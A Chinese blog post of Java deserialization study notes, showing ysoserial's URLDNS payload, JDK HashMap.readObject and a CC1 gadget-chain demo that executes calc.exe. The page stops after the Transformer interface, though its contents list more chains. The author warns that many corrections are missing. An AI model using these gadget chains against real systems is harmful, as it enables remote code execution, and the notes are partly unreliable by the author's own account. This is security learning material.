<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>AmiaaaZ's Site | Java学习笔记Ⅲ</title><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=generator content="Hugo 0.104.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link href=/dist/app.css rel=stylesheet><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-203328343-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script>
<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous><script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><script>(function(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(e)}),i.parentNode.insertBefore(n,i)})("https://amiaaaz.github.io/lib/pangu.min.js",function(){pangu.spacingPage()})</script><style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style></head><body class="bg-gray-100 text-gray-700 font-sans"><div class="p-6 sm:p-10 md:p-16 flex flex-wrap"><header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl"><div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2"><div><h2><a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a></h2></div><h1 class=pt-2>Java学习笔记Ⅲ</h1><h3 class="text-java-700 font-normal leading-relaxed pt-2">记录向，CC&CB&Shiro | *有大量修正未同步，请勿参考本文学习</h3><div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light"><a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
&nbsp;&nbsp;
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/java>Java</a>&nbsp;/
<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/unserialize>unserialize</a></div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2022-03-23T18:40:31+08:00>2022-3-23 18:40</time></div><details class=toc open><summary><hr></summary><div class="inline toc-content"><nav id=TableOfContents><ul><li><a href=#序列化反序列化>序列化&反序列化</a></li><li><a href=#urldns>URLDNS</a><ul><li><a href=#hashmap>HashMap</a></li></ul></li><li><a href=#cc18u71>CC1(&lt;8u71</a><ul><li><a href=#前置>前置</a></li><li><a href=#demo>demo</a></li><li><a href=#transformedmap>TransformedMap</a></li><li><a href=#lazymap>LazyMap</a></li></ul></li><li><a href=#cc6>CC6</a></li><li><a href=#cc38u71>CC3(&lt;8u71</a></li><li><a href=#cck1shiro-550>CCK1(Shiro-550)</a><ul><li><a href=#cc6为什么不行>CC6为什么不行</a></li><li><a href=#搞个行的>搞个行的</a></li></ul></li><li><a href=#cc2---cc4>CC2 - cc4</a><ul><li><a href=#templatesimpl>TemplatesImpl</a></li><li><a href=#修复>修复</a></li></ul></li><li><a href=#cb1>CB1</a><ul><li><a href=#shiro-550无cc>Shiro-550(无cc</a></li></ul></li></ul></nav></div></details><hr></div></header><main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4"><article><section class="mx-auto content"><div class=c-rich-text><h2 id=序列化反序列化>序列化&反序列化</h2><p>与PHP类似，java的<code>readObject</code>对标<code>__wakeup</code>，但不完全一样，<code>readObject</code>倾向于解决“反序列化时如何还原一个完整对象”这个问题，而PHP的<code>__wakeup</code>倾向于解决“反序列化后如何初始化这个对象”的问题，它可以在反序列化之后执行初始化操作，该赋的值基本由<code>__construct</code>控制，真正的入手点一般在<code>__destruct</code>中</p><p>对java来说，一个可利用的<code>readObject</code>是链子最初的起点</p><p>在序列化对象时会调用对象的<code>writeObject</code>方法，参数类型是<code>ObjectOutputStream</code>，这个类有一个<code>annotateClass</code>方法，可以通过重写这个方法来向序列化后的数据中写入内容，这个内容位于<code>objectAnnotation</code>中</p><p>相应的，反序列化时会调用<code>readObject</code>，可以读出前面写入的内容进行处理</p><p>python的反序列化危害最大，可以直接操控PVM栈上的指令</p><h2 id=urldns>URLDNS</h2><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>URLDNS</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>ObjectPayload</span><span style=color:#f92672>&lt;</span><span style=color:#111>Object</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getObject</span><span style=color:#f92672>(</span><span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>url</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>//Avoid DNS resolution during payload creation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#75715e>//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#111>URLStreamHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>SilentURLStreamHandler</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#111>HashMap</span> <span style=color:#111>ht</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span> <span style=color:#75715e>// HashMap that will contain the URL
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#111>URL</span> <span style=color:#111>u</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>URL</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>url</span><span style=color:#f92672>,</span> <span style=color:#111>handler</span><span style=color:#f92672>);</span> <span style=color:#75715e>// URL to use as the Key
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#111>ht</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>u</span><span style=color:#f92672>,</span> <span style=color:#111>url</span><span style=color:#f92672>);</span> <span style=color:#75715e>//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>                <span style=color:#111>Reflections</span><span style=color:#f92672>.</span><span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>u</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;hashCode&#34;</span><span style=color:#f92672>,</span> <span style=color:#f92672>-</span><span style=color:#111>1</span><span style=color:#f92672>);</span> <span style=color:#75715e>// During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>return</span> <span style=color:#111>ht</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#00a8c8>final</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>PayloadRunner</span><span style=color:#f92672>.</span><span style=color:#75af00>run</span><span style=color:#f92672>(</span><span style=color:#111>URLDNS</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>args</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * using the serialized object.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>         *
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;b&gt;Potential false negative:&lt;/b&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * second resolution.&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>         */</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>SilentURLStreamHandler</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>URLStreamHandler</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>protected</span> <span style=color:#111>URLConnection</span> <span style=color:#75af00>openConnection</span><span style=color:#f92672>(</span><span style=color:#111>URL</span> <span style=color:#111>u</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>synchronized</span> <span style=color:#111>InetAddress</span> <span style=color:#75af00>getHostAddress</span><span style=color:#f92672>(</span><span style=color:#111>URL</span> <span style=color:#111>u</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>这是yoserial中URLDNS部分的源码，很短</p><p>整个链子的攻击利用的是HashMap会调用key的hashCode方法来定位对应的value，当url object作为key时会由于hashCode的计算进而触发DNS请求（因为要解析hostname是否指向同一个Ip</p><h3 id=hashmap>HashMap</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>private</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>readObject</span><span style=color:#f92672>(</span><span style=color:#111>ObjectInputStream</span> <span style=color:#111>s</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ObjectInputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>GetField</span> <span style=color:#111>fields</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readFields</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Read loadFactor (ignore threshold)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>float</span> <span style=color:#111>lf</span> <span style=color:#f92672>=</span> <span style=color:#111>fields</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;loadFactor&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>0</span><span style=color:#f92672>.</span><span style=color:#75af00>75f</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>lf</span> <span style=color:#f92672>&lt;=</span> <span style=color:#111>0</span> <span style=color:#f92672>||</span> <span style=color:#111>Float</span><span style=color:#f92672>.</span><span style=color:#75af00>isNaN</span><span style=color:#f92672>(</span><span style=color:#111>lf</span><span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvalidObjectException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal load factor: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>lf</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>lf</span> <span style=color:#f92672>=</span> <span style=color:#111>Math</span><span style=color:#f92672>.</span><span style=color:#75af00>min</span><span style=color:#f92672>(</span><span style=color:#111>Math</span><span style=color:#f92672>.</span><span style=color:#75af00>max</span><span style=color:#f92672>(</span><span style=color:#111>0</span><span style=color:#f92672>.</span><span style=color:#75af00>25f</span><span style=color:#f92672>,</span> <span style=color:#111>lf</span><span style=color:#f92672>),</span> <span style=color:#111>4</span><span style=color:#f92672>.</span><span style=color:#75af00>0f</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>HashMap</span><span style=color:#f92672>.</span><span style=color:#75af00>UnsafeHolder</span><span style=color:#f92672>.</span><span style=color:#75af00>putLoadFactor</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>,</span> <span style=color:#111>lf</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>reinitialize</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readInt</span><span style=color:#f92672>();</span>                <span style=color:#75715e>// Read and ignore number of buckets
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>int</span> <span style=color:#111>mappings</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readInt</span><span style=color:#f92672>();</span> <span style=color:#75715e>// Read number of mappings (size)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>mappings</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>0</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>InvalidObjectException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Illegal mappings count: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>mappings</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>mappings</span> <span style=color:#f92672>==</span> <span style=color:#111>0</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// use defaults
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>mappings</span> <span style=color:#f92672>&gt;</span> <span style=color:#111>0</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>float</span> <span style=color:#111>fc</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>float</span><span style=color:#f92672>)</span><span style=color:#111>mappings</span> <span style=color:#f92672>/</span> <span style=color:#111>lf</span> <span style=color:#f92672>+</span> <span style=color:#111>1</span><span style=color:#f92672>.</span><span style=color:#75af00>0f</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>int</span> <span style=color:#111>cap</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((</span><span style=color:#111>fc</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>DEFAULT_INITIAL_CAPACITY</span><span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span>                   <span style=color:#111>DEFAULT_INITIAL_CAPACITY</span> <span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                   <span style=color:#f92672>(</span><span style=color:#111>fc</span> <span style=color:#f92672>&gt;=</span> <span style=color:#111>MAXIMUM_CAPACITY</span><span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span>                   <span style=color:#111>MAXIMUM_CAPACITY</span> <span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                   <span style=color:#111>tableSizeFor</span><span style=color:#f92672>((</span><span style=color:#00a8c8>int</span><span style=color:#f92672>)</span><span style=color:#111>fc</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>float</span> <span style=color:#111>ft</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>float</span><span style=color:#f92672>)</span><span style=color:#111>cap</span> <span style=color:#f92672>*</span> <span style=color:#111>lf</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>threshold</span> <span style=color:#f92672>=</span> <span style=color:#f92672>((</span><span style=color:#111>cap</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>MAXIMUM_CAPACITY</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#111>ft</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>MAXIMUM_CAPACITY</span><span style=color:#f92672>)</span> <span style=color:#f92672>?</span>
</span></span><span style=display:flex><span>                     <span style=color:#f92672>(</span><span style=color:#00a8c8>int</span><span style=color:#f92672>)</span><span style=color:#111>ft</span> <span style=color:#f92672>:</span> <span style=color:#111>Integer</span><span style=color:#f92672>.</span><span style=color:#75af00>MAX_VALUE</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Check Map.Entry[].class since it&#39;s the nearest public type to
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>// what we&#39;re actually creating.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>SharedSecrets</span><span style=color:#f92672>.</span><span style=color:#75af00>getJavaOISAccess</span><span style=color:#f92672>().</span><span style=color:#75af00>checkArray</span><span style=color:#f92672>(</span><span style=color:#111>s</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>Entry</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>cap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>({</span><span style=color:#d88200>&#34;rawtypes&#34;</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;unchecked&#34;</span><span style=color:#f92672>})</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Node</span><span style=color:#f92672>&lt;</span><span style=color:#111>K</span><span style=color:#f92672>,</span><span style=color:#111>V</span><span style=color:#f92672>&gt;[]</span> <span style=color:#111>tab</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Node</span><span style=color:#f92672>&lt;</span><span style=color:#111>K</span><span style=color:#f92672>,</span><span style=color:#111>V</span><span style=color:#f92672>&gt;[])</span><span style=color:#00a8c8>new</span> <span style=color:#111>Node</span><span style=color:#f92672>[</span><span style=color:#111>cap</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#111>table</span> <span style=color:#f92672>=</span> <span style=color:#111>tab</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read the keys and values, and put the mappings in the HashMap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>for</span> <span style=color:#f92672>(</span><span style=color:#00a8c8>int</span> <span style=color:#111>i</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span> <span style=color:#111>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#111>mappings</span><span style=color:#f92672>;</span> <span style=color:#111>i</span><span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                <span style=color:#111>K</span> <span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>K</span><span style=color:#f92672>)</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;unchecked&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>                <span style=color:#111>V</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>V</span><span style=color:#f92672>)</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#75af00>readObject</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>putVal</span><span style=color:#f92672>(</span><span style=color:#111>hash</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>),</span> <span style=color:#111>key</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>这是它重写的<code>readObject</code>方法，在最后一行对key计算hash值，会触发hashCode方法，而计算hashCode时会触发DNS的请求</p><p>构造链子时我们需要初始化一个<code>java.net.URL</code>对象作为HashMap的key，之后将这个对象的hashCode设为-1，强制在反序列化时重新计算hashCode，触发后续调用</p><p>另外在ysoserial的payload生成时为了防止执行DNS请求，使用了<code>SilentURLStreamHandler</code></p><h2 id=cc18u71>CC1(&lt;8u71</h2><p>在p牛的java安全漫谈中给出了CC1的极简版demo</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC1</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>getRuntime</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]{</span><span style=color:#d88200>&#34;calc.exe&#34;</span><span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>TransformedMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;test&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;amiz&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=前置>前置</h3><p>首先理解一下没见过的几个函数</p><ul><li><code>Transformer</code></li></ul><p>一个接口，只有一个待实现的transform方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>interface</span> <span style=color:#75af00>Transformer</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>input</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
